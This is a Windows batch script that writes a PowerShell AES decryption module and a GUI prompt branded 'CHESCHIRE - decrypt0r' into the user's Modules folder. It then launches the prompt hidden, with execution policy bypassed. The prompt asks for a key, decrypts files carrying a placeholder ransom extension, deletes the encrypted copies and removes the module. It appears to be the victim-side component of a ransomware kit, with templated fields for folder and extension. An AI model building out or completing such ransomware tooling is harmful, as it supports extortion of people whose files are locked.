@echo off
mkdir %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry
cd %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry

echo function New-CryptographyKey() { > decry.psm1
echo [CmdletBinding()] >> decry.psm1
echo [OutputType([System.Security.SecureString])] >> decry.psm1
echo [OutputType([String], ParameterSetName='PlainText')] >> decry.psm1
echo Param([Parameter(Mandatory=$false, Position=1)] >> decry.psm1
echo [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> decry.psm1
echo [String]$Algorithm='AES', >> decry.psm1
echo [Parameter(Mandatory=$false, Position=2)] >> decry.psm1
echo [Int]$KeySize, >> decry.psm1
echo [Parameter(ParameterSetName='PlainText')] >> decry.psm1
echo [Switch]$AsPlainText) >> decry.psm1
echo Process { >> decry.psm1
echo try { >> decry.psm1
echo $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> decry.psm1
echo if($PSBoundParameters.ContainsKey('KeySize')) { >> decry.psm1
echo $Crypto.KeySize = $KeySize >> decry.psm1
echo } >> decry.psm1
echo $Crypto.GenerateKey() >> decry.psm1
echo if($AsPlainText) { >> decry.psm1
echo return [System.Convert]::ToBase64String($Crypto.Key) >> decry.psm1
echo } >> decry.psm1
echo else { >> decry.psm1
echo return [System.Convert]::ToBase64String($Crypto.Key) ^| ConvertTo-SecureString -AsPlainText -Force >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1
echo catch { Write-Error $_ }  >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1
echo Function Unprotect-File { >> decry.psm1
echo [CmdletBinding(DefaultParameterSetName='SecureString')] >> decry.psm1
echo [OutputType([System.IO.FileInfo[]])] >> decry.psm1
echo Param( >> decry.psm1
echo [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] >> decry.psm1
echo [Alias('PSPath','LiteralPath')] >> decry.psm1
echo [String[]]$FileName, >> decry.psm1
echo [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)] >> decry.psm1
echo [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> decry.psm1
echo [String]$Algorithm = 'AES', >> decry.psm1
echo [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')] >> decry.psm1
echo [System.Security.SecureString]$Key, >> decry.psm1
echo [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')] >> decry.psm1
echo [String]$KeyAsPlainText, >> decry.psm1
echo [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)] >> decry.psm1
echo [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC', >> decry.psm1
echo [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)] >> decry.psm1
echo [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7', >> decry.psm1
echo [Parameter(Mandatory=$false, Position=6)] >> decry.psm1
echo [String]$Suffix, >> decry.psm1
echo [Parameter()] >> decry.psm1
echo [Switch]$RemoveSource >> decry.psm1
echo ) >> decry.psm1
echo Process { >> decry.psm1
echo try { >> decry.psm1
echo if($PSCmdlet.ParameterSetName -eq 'PlainText') { >> decry.psm1
echo $Key = $KeyAsPlainText ^| ConvertTo-SecureString -AsPlainText -Force >> decry.psm1
echo } >> decry.psm1
echo $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key) >> decry.psm1
echo $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)) >> decry.psm1
echo $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> decry.psm1
echo $Crypto.Mode = $CipherMode >> decry.psm1
echo $Crypto.Padding = $PaddingMode >> decry.psm1
echo $Crypto.KeySize = $EncryptionKey.Length*8 >> decry.psm1
echo $Crypto.Key = $EncryptionKey >> decry.psm1
echo } >> decry.psm1
echo Catch { Write-Error $_ -ErrorAction Stop } >> decry.psm1
echo if(-not $PSBoundParameters.ContainsKey('Suffix')) { >> decry.psm1
echo $Suffix = ".$Algorithm" >> decry.psm1
echo } >> decry.psm1
echo $Files = Get-Item -LiteralPath $FileName >> decry.psm1
echo ForEach($File in $Files) { >> decry.psm1
echo If(-not $File.Name.EndsWith($Suffix)) { >> decry.psm1
echo Write-Error "$($File.FullName) does not have an extension of '$Suffix'." >> decry.psm1
echo Continue >> decry.psm1
echo } >> decry.psm1
echo $DestinationFile = $File.FullName -replace "$Suffix$" >> decry.psm1
echo Try { >> decry.psm1
echo $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open) >> decry.psm1
echo $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create) >> decry.psm1
echo [Byte[]]$LenIV = New-Object Byte[] 4 >> decry.psm1
echo $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) ^| Out-Null >> decry.psm1
echo $FileStreamReader.Read($LenIV,  0, 3) ^| Out-Null >> decry.psm1
echo [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0) >> decry.psm1
echo [Byte[]]$IV = New-Object Byte[] $LIV >> decry.psm1
echo $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) ^| Out-Null >> decry.psm1
echo $FileStreamReader.Read($IV, 0, $LIV) ^| Out-Null >> decry.psm1
echo $Crypto.IV = $IV >> decry.psm1
echo $Transform = $Crypto.CreateDecryptor() >> decry.psm1
echo $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write) >> decry.psm1
echo $FileStreamReader.CopyTo($CryptoStream) >> decry.psm1
echo $CryptoStream.FlushFinalBlock() >> decry.psm1
echo $CryptoStream.Close() >> decry.psm1
echo $FileStreamReader.Close() >> decry.psm1
echo $FileStreamWriter.Close() >> decry.psm1
echo if($RemoveSource){ >> decry.psm1
echo Remove-Item $File.FullName >> decry.psm1
echo } >> decry.psm1
echo Get-Item $DestinationFile ^| Add-Member -MemberType NoteProperty -Name SourceFile -Value $File.FullName -PassThru >> decry.psm1
echo } >> decry.psm1
echo Catch { >> decry.psm1
echo Write-Error $_ >> decry.psm1
echo If($FileStreamWriter) { >> decry.psm1
echo $FileStreamWriter.Close() >> decry.psm1
echo Remove-Item -LiteralPath $DestinationFile -Force >> decry.psm1
echo } >> decry.psm1
echo Continue >> decry.psm1
echo }  >> decry.psm1
echo Finally { >> decry.psm1
echo if($CryptoStream){ >> decry.psm1
echo $CryptoStream.Close() >> decry.psm1
echo } >> decry.psm1
echo if($FileStreamReader){ >> decry.psm1
echo $FileStreamReader.Close() >> decry.psm1
echo } >> decry.psm1
echo if($FileStreamWriter){ >> decry.psm1
echo $FileStreamWriter.Close() >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1
echo } >> decry.psm1

echo function CustomInputBox([string] $title, [string] $message, [string] $defaultText){ > decryGUI.ps1
echo [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") >> decryGUI.ps1
echo [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")  >> decryGUI.ps1
echo $userForm = New-Object System.Windows.Forms.Form >> decryGUI.ps1
echo $userForm.Text = "$title" >> decryGUI.ps1
echo $userForm.Size = New-Object System.Drawing.Size(300,150) >> decryGUI.ps1
echo $userForm.StartPosition = "CenterScreen" >> decryGUI.ps1
echo $userForm.AutoSize = $False >> decryGUI.ps1
echo $userForm.MinimizeBox = $False >> decryGUI.ps1
echo $userForm.MaximizeBox = $False >> decryGUI.ps1
echo $userForm.SizeGripStyle = "Hide" >> decryGUI.ps1
echo $userForm.WindowState = "Normal" >> decryGUI.ps1
echo $userForm.FormBorderStyle = "Fixed3D" >> decryGUI.ps1
echo $OKButton = New-Object System.Windows.Forms.Button >> decryGUI.ps1
echo $OKButton.Location = New-Object System.Drawing.Size(115,80) >> decryGUI.ps1
echo $OKButton.Size = New-Object System.Drawing.Size(75,23) >> decryGUI.ps1
echo $OKButton.Text = "DECRYPT" >> decryGUI.ps1
echo $OKButton.Add_Click({$value=$objTextBox.Text;$userForm.Close()}) >> decryGUI.ps1
echo $userForm.Controls.Add($OKButton) >> decryGUI.ps1
echo $CancelButton = New-Object System.Windows.Forms.Button >> decryGUI.ps1
echo $CancelButton.Location = New-Object System.Drawing.Size(195,80) >> decryGUI.ps1
echo $CancelButton.Size = New-Object System.Drawing.Size(75,23) >> decryGUI.ps1
echo $CancelButton.Text = "Cancel" >> decryGUI.ps1
echo $CancelButton.Add_Click({$userForm.Close()}) >> decryGUI.ps1
echo $userForm.Controls.Add($CancelButton) >> decryGUI.ps1
echo $userLabel = New-Object System.Windows.Forms.Label >> decryGUI.ps1
echo $userLabel.Location = New-Object System.Drawing.Size(10,20) >> decryGUI.ps1
echo $userLabel.Size = New-Object System.Drawing.Size(280,20) >> decryGUI.ps1
echo $userLabel.Text = "$message" >> decryGUI.ps1
echo $userForm.Controls.Add($userLabel) >> decryGUI.ps1
echo $objTextBox = New-Object System.Windows.Forms.TextBox >> decryGUI.ps1
echo $objTextBox.Location = New-Object System.Drawing.Size(10,40) >> decryGUI.ps1
echo $objTextBox.Size = New-Object System.Drawing.Size(260,20) >> decryGUI.ps1
echo $objTextBox.Text = "$defaultText" >> decryGUI.ps1
echo $userForm.Controls.Add($objTextBox) >> decryGUI.ps1
echo $userForm.Topmost = $True >> decryGUI.ps1
echo $userForm.Opacity = 0.91 >> decryGUI.ps1
echo $userForm.ShowIcon = $False >> decryGUI.ps1
echo $userForm.Add_Shown({$userForm.Activate()}) >> decryGUI.ps1
echo [void] $userForm.ShowDialog() >> decryGUI.ps1
echo $value = $objTextBox.Text >> decryGUI.ps1
echo return $value >> decryGUI.ps1
echo } >> decryGUI.ps1
echo $secretkey = CustomInputBox "CHESCHIRE - decrypt0r" "Enter the decryption key" "" >> decryGUI.ps1
echo if ($secretkey -ne $null){ >> decryGUI.ps1
echo Import-Module decry >> decryGUI.ps1
echo $files = get-childitem folder_location -recurse -Include *cryExtension ^| where {^! $_.PSIsContainer} >> decryGUI.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText $secretkey -Suffix 'cryExtension' -RemoveSource } >> decryGUI.ps1
echo Remove-Item -path $home\Documents\WindowsPowerShell\Modules\decry\* >> decryGUI.ps1
echo } >> decryGUI.ps1

cd %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry
powershell -W Hidden -ExecutionPolicy ByPass -File decryGUI.ps1

exit
